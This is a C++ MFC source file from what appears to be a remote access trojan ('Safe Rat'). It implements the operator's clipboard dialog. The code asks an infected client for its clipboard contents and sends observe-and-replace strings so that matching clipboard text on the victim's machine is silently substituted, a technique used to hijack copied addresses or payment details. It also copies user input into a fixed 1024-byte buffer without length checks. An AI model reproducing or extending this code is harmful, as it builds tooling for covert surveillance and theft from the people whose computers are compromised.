// ClipboardDlg.cpp : 实现文件
//

#include "pch.h"
#include "Safe Rat.h"
#include "ClipboardDlg.h"
#include "afxdialogex.h"


// CClipboardDlg 对话框

IMPLEMENT_DYNAMIC(CClipboardDlg, CDialogEx)

CClipboardDlg::CClipboardDlg(CWnd* pParent /*=NULL*/, CHpTcpServer* pIOCPServer, ClientContext *pContext)
	: CDialogEx(CClipboardDlg::IDD, pParent)
{
	m_iocpServer = pIOCPServer;
	m_pContext = pContext;
	m_hIcon = LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDI_ICON_KEYBOARD));
	m_bOnClose = FALSE;
}

CClipboardDlg::~CClipboardDlg()
{
}

void CClipboardDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_EDIT3, m_Return_Data);
}


BEGIN_MESSAGE_MAP(CClipboardDlg, CDialogEx)
	ON_WM_CLOSE()
	ON_BN_CLICKED(IDC_BUTTON1, &CClipboardDlg::OnBnClickedButton1)
	ON_BN_CLICKED(IDC_BUTTON2, &CClipboardDlg::OnBnClickedButton2)

END_MESSAGE_MAP()


// CClipboardDlg 消息处理程序

void CClipboardDlg::OnReceiveComplete()
{
	switch (m_pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
	{
	case TOKEN_CLIPBOARD_DATA:
		ReceiveClipboardData();
		break;
	default:
		break;
	}
}


void CClipboardDlg::ReceiveClipboardData()
{
	// 最后填上0
	m_Return_Data.SetWindowText("");
	m_pContext->m_DeCompressionBuffer.Write((LPBYTE)"", 1);
	int	len = m_Return_Data.GetWindowTextLength();
	m_Return_Data.SetSel(len, len);
	m_Return_Data.ReplaceSel((TCHAR *)m_pContext->m_DeCompressionBuffer.GetBuffer(1));
}

void CClipboardDlg::OnClose()
{
	m_iocpServer->Disconnect(m_pContext);
	m_bOnClose = TRUE;
	CDialogEx::OnClose();
}


void CClipboardDlg::PostNcDestroy()
{
	if (!m_bOnClose)
		OnClose();
	CDialogEx::PostNcDestroy();
	delete this;
}


BOOL CClipboardDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon

	return TRUE;  // return TRUE unless you set the focus to a control
	// 异常: OCX 属性页应返回 FALSE
}


void CClipboardDlg::OnBnClickedButton1()
{
	// TODO: Add your control notification handler code here
	BYTE bToken = COMMAND_GETCLIPBOARD;
	m_iocpServer->Send(m_pContext, &bToken, sizeof(BYTE));
}


void CClipboardDlg::OnBnClickedButton2()
{
	// TODO: Add your control notification handler code here
	UpdateData(TRUE);
	CString Observe, Replace;

	GetDlgItem(IDC_OBSERVE_DATA)->GetWindowText(Observe);
	GetDlgItem(IDC_REPLACE_DATA)->GetWindowText(Replace);


	UpdateData(TRUE);
	LPBYTE			lpBuffer = NULL;
	DWORD			dwOffset = 0;
	lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1024);
	lpBuffer[0] = COMMAND_SETCLIPBOARD;
	dwOffset = 1;

	memcpy(lpBuffer + dwOffset, Observe.GetBuffer(0), (Observe.GetLength() + 1) * sizeof(TCHAR));
	dwOffset += (Observe.GetLength() + 1) * sizeof(TCHAR);

	memcpy(lpBuffer + dwOffset, Replace.GetBuffer(0), (Replace.GetLength() + 1) * sizeof(TCHAR));
	dwOffset += (Replace.GetLength() + 1) * sizeof(TCHAR);

	lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, dwOffset, LMEM_ZEROINIT | LMEM_MOVEABLE);
	m_iocpServer->Send(m_pContext, lpBuffer, dwOffset);
	LocalFree(lpBuffer);
}



